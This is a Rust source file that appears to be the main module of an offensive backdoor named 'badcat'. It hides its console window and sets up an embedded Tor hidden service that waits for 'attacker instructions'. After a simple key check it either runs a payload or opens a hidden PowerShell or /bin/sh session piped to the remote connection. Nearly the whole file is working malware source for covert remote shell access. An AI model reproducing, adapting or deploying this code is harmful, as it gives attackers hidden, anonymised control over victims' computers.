// hides console window
#![windows_subsystem = "windows"]

mod config;
mod payload;
mod setting;

use std::{env, fs, io};
use std::error::Error;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::PathBuf;
use std::process::{Command, Stdio};

use setting::Setting;

use badcat_lib::io as badcat_io;
use tor::Tor;

fn main() -> Result<(), Box<dyn Error>> {
    let setting = Setting::new()?;

    let argument = env::args().nth(1).unwrap_or("".to_owned());

    if argument.eq("--exec-payload") {
        return payload::execute(&setting)
    }

    if cfg!(unix) {
        // For unix-like OSes enforces the HiddenServiceDir to
        // be private, only readable and writable by the owner.
        //
        // It's a best-effort approach so it can fail and hopefully
        // all works fine. 
        if let Ok(proc) = Command::new("chmod")
            .args(["700", setting.tor_dir.to_str().unwrap()])
            .status() {
            if !proc.success() {
                println!("WARN: problem changing data directory permission");
            }
        } else {
            println!("WARN: problem calling chmod on data directory");
        }
    }

    start_control_server(&setting)?;

    Ok(())
}

/// Write a new torrc to `path`. It always reads the template torrc from `setting`.
fn unbundle_torrc(path: &PathBuf, port: u16, setting: &Setting) -> io::Result<()> {
    let mut contents = setting.torrc.clone();

    contents = contents.replace("@{DATA_DIR}", setting.tor_dir.to_str().unwrap());

    contents = contents.replace("@{SERVICE_ADDR}", &format!("127.0.0.1:{}", port));

    fs::write(&path, &contents)
}

/// Start the TCP server for receiving attacker instructions.
fn start_control_server(setting: &Setting) -> Result<(), Box<dyn Error>> {
    let listener = TcpListener::bind("127.0.0.1:0")?;

    let port = listener.local_addr()?.port();
    println!("INFO: listening at: {:?}", port);

    let config = &setting.tor_dir.join("config");
    unbundle_torrc(&config, port, &setting)?;

    // start the embeded Tor instance
    let tor = Tor::new(config);

    for stream in listener.incoming() {
        match stream {
            Ok(mut stream) => {
                println!("INFO: received connection");
                if let Ok(()) = authenticate(&mut stream, &setting) {
                    println!("INFO: attacker authenticated");
                    if setting.uses_payload {
                        // Triggers the payload to execute
                        if let Err(err) = payload::from_process() {
                            println!("problem creating payload process: {:?}", err);
                        }
                    } else if let Err(error) = connect_shell(stream) {
                        println!("connection error: {:?}", error);
                    }
                } else {
                    println!("INFO: failed authentication");
                }
            }
            Err(error) => return Err(Box::new(error)),
        }
    }

    tor.stop()?;

    Ok(())
}

/// An extremely simple TCP authentication. Receives the password - 88 bytes
/// by default with the 64 byte secret key - and compares against the secret key.
/// 
/// Sends a 1 byte one value if authenticated and zero otherwise.
fn authenticate(stream: &mut TcpStream, setting: &Setting) -> Result<(), Box<dyn Error>> {
    let mut buf = Vec::new();

    // allocate a buffer size of key length
    for _ in 0..setting.key.len() {
        buf.push(0);
    }

    if let Err(err) = stream.read_exact(&mut buf) {
        return Err(err.into());
    }

    let untrusted_key = String::from_utf8_lossy(&buf);

    let equals = untrusted_key.eq(&setting.key);

    let reply = if equals { &[1] } else { &[0] };

    if let Err(err) = stream.write(reply) {
        return Err(err.into());
    }

    if let Err(err) = stream.flush() {
        return Err(err.into());
    }

    if equals {
        Ok(())
    } else {
        Err(String::from("not authenticated").into())
    }
}

/// Start a shell process and redirect STDIN, STDOUT and STDERR to
/// the TCP stream.
fn connect_shell(stream: TcpStream) -> Result<(), Box<dyn Error>> {
    let mut args: Vec<&str> = Vec::new();

    let shell = if cfg!(windows) {
        // used powershell instead of cmd because of hidden console window
        args.extend(["-WindowStyle", "Hidden"]);
        "powershell"
    } else {
        args.push("-i");
        "/bin/sh"
    };

    let proc = Command::new(shell)
        .args(args)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    let stdin = proc.stdin.unwrap();
    let stdout = proc.stdout.unwrap();
    let stderr = proc.stderr.unwrap();

    let stream_in = stream.try_clone()?;
    let stream_out = stream.try_clone()?;
    let stream_err = stream.try_clone()?;

    let in_thread = badcat_io::pipe_io(stream_in, stdin);
    let out_thread = badcat_io::pipe_io(stdout, stream_out);
    let err_thread = badcat_io::pipe_io(stderr, stream_err);

    in_thread.join().unwrap();
    out_thread.join().unwrap();
    err_thread.join().unwrap();

    Ok(())
}
